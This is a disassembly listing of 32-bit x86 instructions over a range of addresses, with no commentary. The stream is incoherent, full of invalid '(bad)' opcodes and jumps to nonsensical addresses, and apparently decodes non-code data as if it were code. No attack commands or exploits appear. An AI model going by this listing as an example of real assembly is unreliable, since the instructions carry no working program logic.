  41fa0b:	pop    ds
  41fa0c:	mov    dh,0xa8
  41fa0e:	(bad)  
  41fa0f:	xchg   edi,eax
  41fa10:	sbb    al,0x10
  41fa12:	fwait
  41fa13:	push   esp
  41fa14:	pusha  
  41fa15:	push   ebx
  41fa16:	outs   dx,DWORD PTR ds:[esi]
  41fa17:	out    0x91,eax
  41fa19:	xchg   ecx,eax
  41fa1a:	daa    
  41fa1b:	inc    ebp
  41fa1c:	outs   dx,DWORD PTR ds:[esi]
  41fa1d:	sbb    al,0x55
  41fa1f:	pushf  
  41fa20:	jecxz  0x41fa07
  41fa22:	pop    ecx
  41fa23:	jle    0x41fa5f
  41fa25:	push   ecx
  41fa26:	fadd   QWORD PTR [esi]
  41fa28:	xchg   ecx,eax
  41fa29:	fucomp st(1)
  41fa2b:	push   cs
  41fa2c:	jl     0x41f9f7
  41fa2e:	inc    esp
  41fa2f:	mov    esp,0x36bbd2ae
  41fa34:	xor    BYTE PTR [ebp-0x4d3feeb6],dh
  41fa3a:	(bad)  
  41fa3b:	clc    
  41fa3c:	scas   eax,DWORD PTR es:[edi]
  41fa3d:	pushf  
  41fa3e:	jno    0x41fa83
  41fa40:	stos   BYTE PTR es:[edi],al
  41fa41:	call   0x5bc2:0x59db6a3f
  41fa48:	push   ebx
  41fa49:	mov    edi,eax
  41fa4b:	(bad)  [edx-0x38d15981]
  41fa51:	or     DWORD PTR [ecx+0x43fd8809],ebp
  41fa57:	shl    BYTE PTR [ebp-0x7],1
  41fa5a:	inc    eax
  41fa5b:	push   0xffffffdf
  41fa5d:	repz cld 
  41fa5f:	ja     0x41fabd
  41fa61:	adc    ecx,esi
  41fa63:	xchg   ebp,eax
  41fa64:	or     eax,0x4f7595aa
  41fa69:	pop    ss
  41fa6a:	sbb    DWORD PTR [ecx+0x5a81],edx
	...
  41fad4:	add    BYTE PTR [eax],al
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0xa2e745f7
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	dec    ecx
  41faef:	dec    esi
  41faf0:	test   eax,0xa591a853
  41faf5:	sahf   
  41faf6:	or     DWORD PTR [edi],eax
  41faf8:	(bad)  
  41faf9:	push   0xde5aa79a
  41fafe:	cmc    
  41faff:	int    0x65
  41fb01:	cmp    eax,0x8324dfcc
  41fb06:	les    eax,FWORD PTR [ebp-0x29788b61]
  41fb0c:	dec    edx
  41fb0d:	jle    0x41fb10
  41fb0f:	xor    dh,ah
  41fb11:	call   DWORD PTR [esi+0x66]
  41fb14:	sbb    ebx,DWORD PTR [ecx-0x280f4e96]
  41fb1a:	mov    bl,0x75
  41fb1c:	xchg   DWORD PTR [esi+0x56b8da43],eax
  41fb22:	je     0x41fb75
  41fb24:	(bad)  
  41fb25:	cmp    DWORD PTR [edi+0x16247ba7],eax
  41fb2b:	sti    
  41fb2c:	int3   
  41fb2d:	xchg   ebx,eax
  41fb2e:	scas   eax,DWORD PTR es:[edi]
  41fb2f:	inc    ebp
  41fb30:	and    DWORD PTR [esi],edx
  41fb32:	(bad)  
  41fb34:	call   0x53f164cf
  41fb39:	mov    esp,0x53ce8b38
  41fb3e:	mov    bh,0x2f
  41fb40:	int3   
  41fb41:	mov    al,ds:0x7f6c74d6
  41fb46:	jl     0x41fb3f
  41fb48:	push   edi
  41fb49:	cmp    ah,BYTE PTR [edi]
  41fb4b:	ret    0xd5a2
  41fb4e:	jb     0x41fb47
  41fb50:	jmp    0x1f13e462
  41fb55:	sub    ebx,ebx
  41fb57:	je     0x41fb9d
  41fb59:	jle    0x41fb9a
  41fb5b:	push   0x31e2aa6c
  41fb60:	out    0xc1,al
  41fb62:	mov    BYTE PTR [eax-0x14],cl
  41fb65:	stos   DWORD PTR es:[edi],eax
  41fb66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb67:	mov    ah,0x14
  41fb69:	(bad)  
  41fb6a:	xchg   ecx,eax
  41fb6b:	cmp    eax,0xa704be06
  41fb70:	scas   al,BYTE PTR es:[edi]
  41fb71:	into   
  41fb72:	sbb    ebx,DWORD PTR [edx]
  41fb74:	push   edx
  41fb75:	inc    ecx
  41fb76:	sub    BYTE PTR [edx-0x36],0x67
  41fb7a:	in     al,dx
  41fb7b:	mov    edi,0x19ec3da1
  41fb80:	push   eax
  41fb81:	push   ebp
  41fb82:	jecxz  0x41fb17
  41fb84:	dec    esi
  41fb85:	loopne 0x41fb07
  41fb87:	push   ss
  41fb88:	xor    al,0x4e
  41fb8a:	pop    es
  41fb8b:	push   edx
  41fb8c:	out    0xd,eax
  41fb8e:	jmp    0x41fbd3
  41fb90:	jno    0x41fbfe
  41fb92:	xchg   esp,eax
  41fb93:	addr16 add ah,al
  41fb96:	sar    cl,0xe9
  41fb99:	and    eax,0x2c97879c
  41fb9e:	mov    eax,ds:0x78087920
  41fba3:	mov    edx,0x313a34ae
  41fba8:	jno    0x41fba5
  41fbaa:	sbb    eax,0xf0ead92f
  41fbaf:	mov    edx,0x2a01248c
  41fbb4:	imul   ebx,DWORD PTR [esi+0x16d69c71],0x6315fde
  41fbbe:	push   eax
  41fbbf:	mov    dl,cl
  41fbc1:	push   edi
  41fbc2:	or     DWORD PTR [ecx],esi
  41fbc4:	mov    dh,BYTE PTR [eax+0x78]
  41fbc7:	sahf   
  41fbc8:	pop    ss
  41fbc9:	(bad)  
  41fbca:	nop    DWORD PTR [ecx]
  41fbcd:	jmp    0x9da39ff3
  41fbd2:	pop    esp
  41fbd3:	mov    ss,WORD PTR [ebx-0x291e7ac1]
  41fbd9:	pop    ebx
  41fbda:	or     eax,0x47d76144
  41fbdf:	jb     0x41fb7a
  41fbe1:	xor    eax,0xaf98958b
  41fbe6:	mov    ch,0xfc
  41fbe8:	test   esi,esp
  41fbea:	hlt    
  41fbeb:	out    0xa0,eax
  41fbed:	retf   
	...
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	rcr    DWORD PTR [edx-0x6e],cl
  41fc65:	(bad)  
  41fc66:	addr16 push ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	cmp    al,0x4f
  41fc70:	(bad)  
  41fc71:	cmp    al,BYTE PTR [edx-0x34]
  41fc74:	jbe    0x41fcb2
  41fc76:	add    dl,bl
  41fc78:	jnp    0x41fc62
  41fc7a:	dec    ebp
  41fc7b:	inc    ebx
  41fc7c:	leave  
  41fc7d:	nop
  41fc7e:	out    0xb4,eax
  41fc80:	mov    gs,WORD PTR [esi]
  41fc82:	aam    0x7f
  41fc84:	jbe    0x41fcfc
  41fc86:	(bad)  
  41fc87:	and    DWORD PTR [esp+edx*8-0x3d546ff5],esp
  41fc8e:	daa    
  41fc8f:	add    ebx,DWORD PTR [eax+0x11]
  41fc92:	jns    0x41fc81
  41fc94:	xor    DWORD PTR cs:[edi+0x6b],edi
  41fc98:	mov    al,0x49
  41fc9a:	jns    0x41fc1d
  41fc9c:	cmp    BYTE PTR [ebp+0x30],dl
  41fc9f:	scas   al,BYTE PTR es:[edi]
  41fca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fca1:	cmp    al,0xd6
  41fca3:	inc    ebp
  41fca4:	les    edi,FWORD PTR [edx+0x76e14d8c]
  41fcaa:	fcomp  QWORD PTR [esp+eax*1-0x2]
  41fcae:	pop    esp
  41fcaf:	mov    edi,cs
  41fcb1:	push   eax
  41fcb2:	outs   dx,DWORD PTR ds:[esi]
  41fcb3:	adc    bh,BYTE PTR [ebx+0x2b]
  41fcb6:	(bad)  
  41fcb7:	sti    
  41fcb8:	xor    al,0xc4
  41fcba:	jnp    0x41fcf2
  41fcbc:	std    
  41fcbd:	cmp    ah,al
  41fcbf:	test   BYTE PTR [edi],al
  41fcc1:	std    
  41fcc2:	dec    BYTE PTR [si+0x30d8]
  41fcc7:	fisubr WORD PTR [ecx]
  41fcc9:	into   
  41fcca:	or     ebx,DWORD PTR [esi-0x1b]
  41fccd:	rcr    DWORD PTR [esi-0x78513004],cl
  41fcd3:	and    bh,ah
  41fcd5:	popf   
  41fcd6:	sti    
  41fcd7:	push   0x853d9247
  41fcdc:	mov    ebx,?
  41fcde:	ret    
  41fcdf:	inc    eax
  41fce0:	jae    0x41fd13
  41fce2:	std    
  41fce3:	in     al,dx
  41fce4:	sti    
  41fce5:	sbb    eax,0xaefcbb9b
  41fcea:	test   bl,dh
  41fcec:	adc    cl,BYTE PTR [edi]
  41fcee:	push   ecx
  41fcef:	xchg   BYTE PTR [ebp+0x32],ah
  41fcf2:	add    bl,BYTE PTR [edi+0xda13082]
  41fcf8:	cwde   
  41fcf9:	jmp    0xb4ae:0xe5c8
  41fcff:	pop    ss
  41fd00:	loopne 0x41fc9a
  41fd02:	imul   ebx,ebx,0x26
  41fd05:	int3   
  41fd06:	stos   DWORD PTR es:[edi],eax
  41fd07:	xchg   DWORD PTR [eax-0xa7ecea2],edi
  41fd0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd0e:	cmp    edi,esi
  41fd10:	enter  0xdacf,0x17
  41fd14:	push   ecx
  41fd15:	xor    eax,0xfb18b011
  41fd1a:	je     0x41fd4c
  41fd1c:	out    0x3c,al
  41fd1e:	add    BYTE PTR [edx+0x2a5e5812],dl
  41fd24:	adc    dl,BYTE PTR [ebp+0x5d9a18e0]
  41fd2a:	in     al,0xb0
  41fd2c:	fwait
  41fd2d:	mov    BYTE PTR [eax-0xc320920],al
  41fd33:	sub    ebx,DWORD PTR [edi]
  41fd35:	sahf   
  41fd36:	adc    al,0x57
  41fd38:	inc    edi
  41fd39:	jae    0x41fdaf
  41fd3b:	int3   
  41fd3c:	cmp    esp,DWORD PTR [edi-0x7f]
  41fd3f:	jns    0x41fd40
  41fd41:	cdq    
  41fd42:	je     0x41fd2e
  41fd44:	and    DWORD PTR [ecx-0x44],eax
  41fd47:	jo     0x41fdbc
  41fd49:	(bad)  
  41fd4b:	pop    es
  41fd4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd4d:	mov    bh,0x8e
  41fd4f:	or     eax,0x56c23947
  41fd54:	and    BYTE PTR [eax-0x21],ch
  41fd57:	cmp    al,0xbb
  41fd59:	cmc    
  41fd5a:	loopne 0x41fdd0
  41fd5c:	sbb    ch,BYTE PTR [edi+0x1245c72b]
  41fd62:	jbe    0x41fddd
  41fd64:	clc    
  41fd65:	jno    0x41fd63
  41fd67:	test   cl,ch
  41fd69:	pop    esp
  41fd6a:	or     eax,0xd4e626
	...
  41fdd3:	add    BYTE PTR [eax],al
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	sbb    eax,0x6762c5c9
  41fde7:	push   esi
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	sar    DWORD PTR [edi-0x6454f884],0x33
  41fdf5:	sahf   
  41fdf6:	dec    esp
  41fdf7:	dec    edi
  41fdf8:	push   esi
  41fdf9:	leave  
  41fdfa:	aaa    
  41fdfb:	pop    eax
  41fdfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdfd:	sbb    edi,ebp
  41fdff:	jb     0x41fe32
  41fe01:	or     DWORD PTR [eax],esi
  41fe03:	add    eax,esi
  41fe05:	pop    ebp
  41fe06:	inc    esi
  41fe07:	inc    ecx
  41fe08:	jmp    0x41fe71
  41fe0a:	(bad)  
  41fe0b:	in     al,0x1b
  41fe0d:	into   
  41fe0e:	nop
  41fe0f:	jo     0x41fdca
  41fe11:	pop    eax
  41fe12:	and    al,0x19
  41fe14:	out    0x83,eax
  41fe16:	jle    0x41fde3
  41fe18:	pop    es
  41fe19:	out    dx,al
  41fe1a:	pop    esi
  41fe1b:	inc    esi
  41fe1c:	fwait
  41fe1d:	std    
  41fe1e:	addr16 sub al,0x87
  41fe21:	sti    
  41fe22:	call   0x61a6:0xad903d0b
  41fe29:	push   cs
  41fe2a:	jmp    0x3e9d0e7f
  41fe2f:	dec    eax
  41fe30:	cmp    bh,BYTE PTR ds:0x9af6f1c5
  41fe36:	retf   0x774b
  41fe39:	add    al,0xe9
  41fe3b:	adc    DWORD PTR [eax-0x4433a5ee],0xffffffb1
  41fe42:	sahf   
  41fe43:	(bad)  
  41fe44:	push   esi
  41fe45:	xchg   BYTE PTR [edx],bl
  41fe47:	sti    
  41fe48:	(bad)  
  41fe49:	pop    edx
  41fe4a:	sbb    edx,eax
  41fe4c:	adc    dh,BYTE PTR [ebx-0x3f]
  41fe4f:	jle    0x41fead
  41fe51:	pop    edx
  41fe52:	xor    eax,0x3fff619
  41fe57:	scas   eax,DWORD PTR es:[edi]
  41fe58:	fst    DWORD PTR [eax+0x29d22c1f]
  41fe5e:	pop    ebp
  41fe5f:	or     BYTE PTR [ebp-0x32],al
  41fe62:	push   eax
  41fe63:	fs push ss
  41fe65:	jle    0x41fdf1
  41fe67:	mov    cl,0x33
  41fe69:	adc    edi,DWORD PTR [ebp-0x2e331596]
  41fe6f:	jmp    0x41fe1a
  41fe71:	aaa    
  41fe72:	stc    
  41fe73:	mov    esi,esi
  41fe75:	mov    ah,BYTE PTR [ecx-0x6b55241e]
  41fe7b:	cli    
  41fe7c:	xchg   ebp,eax
  41fe7d:	mov    cl,0x98
  41fe7f:	rol    ch,cl
  41fe81:	adc    DWORD PTR [ebx+0x57],ebp
  41fe84:	test   BYTE PTR [ebp+0x38],0x21
  41fe88:	sub    eax,0xda0832dc
  41fe8d:	jmp    0xd40a:0x1eae856c
  41fe94:	jb     0x41fed4
  41fe96:	push   0xffffffed
  41fe98:	xor    BYTE PTR [eax],bl
  41fe9a:	sub    ah,al
  41fe9c:	xor    ebp,DWORD PTR [ebx]
  41fe9e:	iret   
  41fe9f:	push   edx
  41fea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea1:	cwde   
  41fea2:	pop    edi
  41fea3:	mov    bh,0xa6
  41fea5:	stos   BYTE PTR es:[edi],al
  41fea6:	jmp    0xf3e5:0x7538a701
  41fead:	aas    
  41feae:	cmp    DWORD PTR [ecx-0x4e],0xb8796e72
  41feb5:	xor    BYTE PTR [ebx+0x7945676c],dh
  41febb:	sbb    dl,BYTE PTR [eax-0x22]
  41febe:	dec    edi
  41febf:	mov    ch,0x3c
  41fec1:	rol    BYTE PTR [edi-0x52],cl
  41fec4:	or     al,BYTE PTR [esi]
  41fec6:	mov    bh,0x5e
  41fec8:	cdq    
  41fec9:	fmul   DWORD PTR [edi-0x2c]
  41fecc:	daa    
  41fecd:	sbb    ecx,DWORD PTR [esi+0x114050e8]
  41fed3:	xchg   esp,eax
  41fed4:	jge    0x41fe7d
  41fed6:	jecxz  0x41fefa
  41fed8:	add    eax,0x397bfbc3
  41fedd:	sbb    DWORD PTR ds:0x20084ecd,ebx
  41fee3:	ret    
  41fee4:	jb     0x41ff50
  41fee6:	ins    DWORD PTR es:[edi],dx
  41fee7:	pop    ebx
  41fee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fee9:	jns    0x41fec7
  41feeb:	gs aad 0x34
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0xf3
  41ff63:	inc    edx
  41ff64:	ja     0x41ff22
  41ff66:	addr16 push edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	add    dl,BYTE PTR [ebx+0x2c]
  41ff71:	sbb    ch,BYTE PTR [edi+0x3a539832]
  41ff77:	push   ebx
  41ff78:	mov    dh,0xd3
  41ff7a:	shl    BYTE PTR [eax],cl
  41ff7c:	pop    ebx
  41ff7d:	daa    
  41ff7e:	sbb    eax,ebp
  41ff80:	lea    edx,ds:0x3c2aadc3
  41ff86:	clc    
  41ff87:	ret    0x1f1c
  41ff8a:	fild   QWORD PTR [ecx-0x61436f33]
  41ff90:	fistp  QWORD PTR [esi+0x5ec6f929]
  41ff96:	xor    dh,BYTE PTR [edx+0x37]
  41ff99:	push   0x9a38e2ed
  41ff9e:	push   ebx
  41ff9f:	sub    eax,0xccec7fb6
  41ffa4:	pop    ds
  41ffa5:	mov    eax,0xa0e1f3d7
  41ffaa:	jne    0x41ffcf
  41ffac:	pop    ds
  41ffad:	cmp    DWORD PTR [ebx+0x41],esi
  41ffb0:	mov    ds:0x10676f6c,eax
  41ffb5:	fist   WORD PTR [edi-0x726dd59d]
  41ffbb:	push   0xffffff8a
  41ffbd:	(bad)  
  41ffbe:	mov    ebx,DWORD PTR [esi+esi*2]
  41ffc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffc2:	push   ebp
  41ffc3:	in     eax,0x19
  41ffc5:	mov    eax,0xb4eeed5d
  41ffca:	or     ch,al
  41ffcc:	and    DWORD PTR [edx],edx
  41ffce:	mov    ebx,0x60b66f5b
  41ffd3:	xchg   DWORD PTR [ebx],eax
  41ffd5:	repz mov ds:0x6fc2156d,al
  41ffdb:	pop    esp
  41ffdc:	jo     0x41ff65
  41ffde:	scas   eax,DWORD PTR es:[edi]
  41ffdf:	repnz adc eax,0x5e99709a
  41ffe5:	xor    eax,0x9a27ad2d
  41ffea:	ror    DWORD PTR [ebx],cl
  41ffec:	adc    eax,0xdbf47981
  41fff1:	sbb    ah,dl
  41fff3:	pop    ebp
  41fff4:	scas   al,BYTE PTR es:[edi]
  41fff5:	nop
  41fff6:	sbb    eax,0xb7691756
  41fffb:	fidivr DWORD PTR [edi]
  41fffd:	jne    0x41fffa
  41ffff:	push   es
  420000:	int3   
  420001:	jne    0x42002b
  420003:	and    al,0x30
  420005:	stos   BYTE PTR es:[edi],al
  420006:	inc    ebx
  420007:	xchg   ecx,eax
  420008:	sub    esi,0xfffffffb
  42000b:	inc    esp
  42000c:	push   ebp
  42000d:	ds and cl,ch
  420010:	mov    al,ds:0x8b8d6082
  420015:	mov    ebp,0x22f93a17
  42001a:	jb     0x41fff8
  42001c:	xchg   esi,eax
  42001d:	mov    dh,0x1
  42001f:	imul   ecx,DWORD PTR [ecx+0x3],0x59
  420023:	and    BYTE PTR [ecx-0xf],ah
  420026:	fadd   QWORD PTR [edx+0x41ed86fa]
  42002c:	push   0xffffffcb
  42002e:	std    
  42002f:	mov    bh,0x29
  420031:	ja     0x420035
  420033:	jno    0x420045
  420035:	sub    eax,0xa42a31eb
  42003a:	sbb    eax,0x84dca21e
  42003f:	leave  
  420040:	jl     0x41fff8
  420042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420043:	ss add eax,0x97f613fb
  420049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42004a:	jmp    0x67f8:0x10a212a2
  420051:	pop    eax
  420052:	arpl   WORD PTR [edx],bx
  420054:	es add esp,ecx
  420057:	mov    ch,0xe7
  420059:	retf   0x8e97
  42005c:	out    dx,al
  42005d:	leave  
  42005e:	cmp    eax,0x711ecef
  420063:	push   ebp
  420064:	push   es
  420065:	ficom  WORD PTR [ebx]
  420067:	aaa    
  420068:	xor    edx,DWORD PTR [esp+ebx*1+0x51]
  42006c:	mov    DWORD PTR [edx+0x0],ebp
	...
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffcb
  4200e3:	or     al,0xd1
  4200e5:	packuswb mm3,QWORD PTR [eax+0x1]
  4200e9:	add    BYTE PTR [eax],al
  4200eb:	add    DWORD PTR [eax],eax
  4200ed:	add    BYTE PTR [esi+0x59],dh
  4200f0:	aad    0x9
  4200f2:	cmp    al,0x10
  4200f4:	mov    esp,0xa9b5d694
  4200f9:	push   es
  4200fa:	out    dx,eax
  4200fb:	inc    esp
  4200fc:	mov    ebx,0xde2bea88
  420101:	mov    ch,0x18
  420103:	not    DWORD PTR gs:[edx+0x56]
  420107:	and    BYTE PTR [ebx],bh
  420109:	fild   DWORD PTR [esi-0x5decd58f]
  42010f:	mov    dl,0x16
  420111:	pop    ebx
  420112:	sbb    al,0x24
  420114:	outs   dx,BYTE PTR ds:[esi]
  420115:	fist   WORD PTR [eax]
  420117:	cmc    
  420118:	sbb    cl,al
  42011a:	dec    ebx
  42011b:	push   ss
  42011c:	cwde   
  42011d:	push   0x16
  42011f:	mov    eax,ds:0xb3b83867
  420124:	or     esp,DWORD PTR [eax-0x44]
  420127:	xor    ecx,esi
  420129:	push   ebp
  42012a:	inc    eax
  42012b:	adc    eax,esi
  42012d:	add    eax,esi
  42012f:	inc    esp
  420130:	cmp    DWORD PTR [eax+esi*2-0xd52116e],esi
  420137:	stos   BYTE PTR es:[edi],al
  420138:	and    DWORD PTR [edx-0x41],eax
  42013b:	shl    ebp,cl
  42013d:	pop    ds
  42013e:	in     al,dx
  42013f:	adc    ebp,DWORD PTR [ebx+esi*1]
  420142:	mov    al,ds:0xe0a70e92
  420147:	sbb    BYTE PTR [ebx],bh
  420149:	sub    al,0x19
  42014b:	mov    edx,0xb2a3fd4d
  420150:	pop    ss
  420151:	iret   
  420152:	pop    edx
  420153:	adc    ebx,ebp
  420155:	xchg   ecx,eax
  420156:	(bad)  [ecx]
  420158:	(bad)  
  420159:	push   esp
  42015a:	test   DWORD PTR [edi+0x34],esi
  42015d:	faddp  st(7),st
  42015f:	pop    es
  420160:	out    0xa4,eax
  420162:	retf   0xc437
  420165:	cmp    ebp,esp
  420167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420168:	rcr    DWORD PTR [ebp+0x7b87752d],0xf7
  42016f:	stc    
  420170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420171:	repnz outs dx,BYTE PTR gs:[esi]
  420174:	xor    DWORD PTR [edi+esi*2],esi
  420177:	jp     0x4201a2
  420179:	gs dec ebp
  42017b:	fstp   QWORD PTR [ebx-0x57471912]
  420181:	imul   esp,edx,0xffffffae
  420184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420185:	or     ebx,eax
  420187:	pop    edi
  420188:	pop    ebp
  420189:	pushf  
  42018a:	xor    DWORD PTR [ebx-0xc31358e],ebp
  420190:	adc    eax,0xa590f493
  420195:	outs   dx,DWORD PTR ds:[esi]
  420196:	cmp    DWORD PTR [esi],ebx
  420198:	scas   al,BYTE PTR es:[edi]
  420199:	mov    bh,0x88
  42019b:	cdq    
  42019c:	and    DWORD PTR [ecx+0x7e],ebx
  42019f:	xor    eax,0x26b990be
  4201a4:	xlat   BYTE PTR ds:[ebx]
  4201a5:	les    esi,FWORD PTR [ebp-0x6f]
  4201a8:	xchg   ecx,eax
  4201a9:	sbb    al,0xd9
  4201ab:	nop
  4201ac:	jmp    0x4201f9
  4201ae:	stos   DWORD PTR es:[edi],eax
  4201af:	cmp    eax,0x5f4be3bb
  4201b4:	mov    BYTE PTR ds:[edi+0x83976eb],al
  4201bb:	and    bl,BYTE PTR [ebx-0x27]
  4201be:	outs   dx,BYTE PTR ds:[esi]
  4201bf:	dec    ebx
  4201c0:	bound  esi,QWORD PTR ds:0xb09f6461
  4201c6:	inc    ebx
  4201c7:	ja     0x420177
  4201c9:	jge    0x42015f
  4201cb:	(bad)  
  4201cc:	int    0xf
  4201ce:	aam    0x62
  4201d0:	call   0xe5ec:0xbdc2dfa4
  4201d7:	add    DWORD PTR [ecx+0x3ee58897],0x53655aef
  4201e1:	cmp    ecx,DWORD PTR [edx-0x66]
  4201e4:	xor    esi,DWORD PTR [eax]
  4201e6:	cmp    al,0xf
  4201e8:	shl    DWORD PTR [edi],1
  4201ea:	push   edx
  4201eb:	xchg   esp,eax
  4201ec:	mov    esi,0x4b
	...
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x66d5b9a6],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	xchg   DWORD PTR [ecx+0x7a],ecx
  420271:	xor    bh,ah
  420273:	pop    edx
  420274:	sti    
  420275:	xchg   edi,eax
  420276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420277:	(bad)  
  420278:	neg    BYTE PTR [ebx+0x65]
  42027b:	dec    esi
  42027c:	mov    al,0x74
  42027e:	fidivr WORD PTR ds:[edi-0x50ff0a77]
  420285:	xor    eax,0xcd647236
  42028a:	xor    eax,0x5dcc5e98
  42028f:	pop    ebp
  420290:	pop    edi
  420291:	rcr    BYTE PTR [edi],0x5f
  420294:	sbb    al,0xbb
  420296:	adc    eax,0x96ed30c2
  42029b:	int    0x70
  42029d:	pop    edx
  42029e:	jge    0x420251
  4202a0:	sub    DWORD PTR [esi-0x63836209],edi
  4202a6:	add    ah,BYTE PTR ds:0x61ea741e
  4202ac:	icebp  
  4202ad:	dec    ecx
  4202ae:	test   DWORD PTR [ecx+0x43],esp
  4202b1:	xchg   edi,eax
  4202b2:	pop    ebx
  4202b3:	popa   
  4202b4:	push   es
  4202b5:	push   esp
  4202b6:	or     BYTE PTR [esi-0x22],0x6f
  4202ba:	inc    esp
  4202bb:	call   0x380807db
  4202c0:	ret    
  4202c1:	jle    0x4202d4
  4202c3:	xchg   esp,eax
  4202c4:	sbb    BYTE PTR [eax],bh
  4202c6:	daa    
  4202c7:	jecxz  0x4202ea
  4202c9:	xchg   ebp,eax
  4202ca:	mov    WORD PTR [edi],fs
  4202cc:	and    al,0xea
  4202ce:	mov    eax,ds:0x8bff0e42
  4202d3:	jnp    0x420346
  4202d5:	jo     0x420316
  4202d7:	mov    esi,0x80b07cd5
  4202dd:	xchg   esp,eax
  4202de:	add    al,0xcf
  4202e0:	mov    cl,0xe
  4202e2:	inc    ebx
  4202e3:	xor    ecx,esi
  4202e5:	pop    edx
  4202e6:	lods   eax,DWORD PTR ds:[esi]
  4202e7:	push   edi
  4202e8:	jns    0x420316
  4202ea:	loopne 0x4202a7
  4202ec:	xchg   ecx,eax
  4202ed:	retf   
  4202ee:	push   0x47
  4202f0:	in     al,dx
  4202f1:	iret   
  4202f2:	mov    esp,esi
  4202f4:	xchg   BYTE PTR [edi],cl
  4202f6:	in     eax,dx
  4202f7:	into   
  4202f8:	fisttp DWORD PTR [ecx]
  4202fa:	pop    edx
  4202fb:	add    al,0x3
  4202fd:	pop    edi
  4202fe:	rol    DWORD PTR [esi-0x3f487d64],cl
  420304:	call   0x3e07:0xda229cc0
  42030b:	dec    eax
  42030c:	cmp    ebx,DWORD PTR [esp+esi*4]
  42030f:	out    dx,al
  420310:	imul   DWORD PTR [ebx+ecx*1-0x74]
  420314:	inc    esi
  420315:	(bad)  
  420316:	int3   
  420317:	adc    ch,ah
  420319:	mov    fs,WORD PTR [eax+0x565b5224]
  42031f:	sti    
  420320:	xchg   edi,eax
  420321:	imul   ebp,DWORD PTR [ecx-0x6d2c46c4],0xffffffa4
  420328:	cld    
  420329:	(bad)  
  42032b:	dec    esp
  42032c:	mov    dl,0x82
  42032e:	cmp    eax,0x233d0782
  420333:	or     ebp,edi
  420335:	jge    0x4203ab
  420337:	xchg   edi,eax
  420338:	inc    esp
  420339:	pop    esp
  42033a:	aad    0xa
  42033c:	das    
  42033d:	(bad)  
  42033e:	cs leave 
  420340:	jmp    0x6b70:0x611d93d1
  420347:	inc    ebp
  420348:	push   cs
  420349:	int    0x2b
  42034b:	(bad)  
  42034c:	cld    
  42034d:	aaa    
  42034e:	mov    edx,0xc0e3b95c
  420353:	push   edx
  420354:	(bad)  
  420355:	stos   DWORD PTR es:[edi],eax
  420356:	add    bl,BYTE PTR [ecx]
  420358:	and    BYTE PTR [ecx-0x3f56811b],bl
  42035e:	je     0x420366
  420360:	(bad)
  420363:	gs jecxz 0x420325
  420366:	int    0x9d
  420368:	call   0xc586c433
  42036d:	xchg   esi,eax
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	adc    al,0xe
  4203e4:	push   eax
  4203e5:	pushf  
  4203e6:	addr16 pop edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	aas    
  4203ef:	dec    eax
  4203f0:	enter  0x49d4,0x91
  4203f4:	call   0xb376:0xcb65870b
  4203fb:	xor    DWORD PTR [ecx-0x18],0x775dcb63
  420402:	push   esp
  420403:	push   ss
  420404:	hlt    
  420405:	sar    BYTE PTR [edi],0xf2
  420408:	pushf  
  420409:	or     ebx,DWORD PTR [eax+0x24d4ef4a]
  42040f:	enter  0x883e,0x71
  420413:	adc    DWORD PTR [ebx-0x74ec4c37],ebp
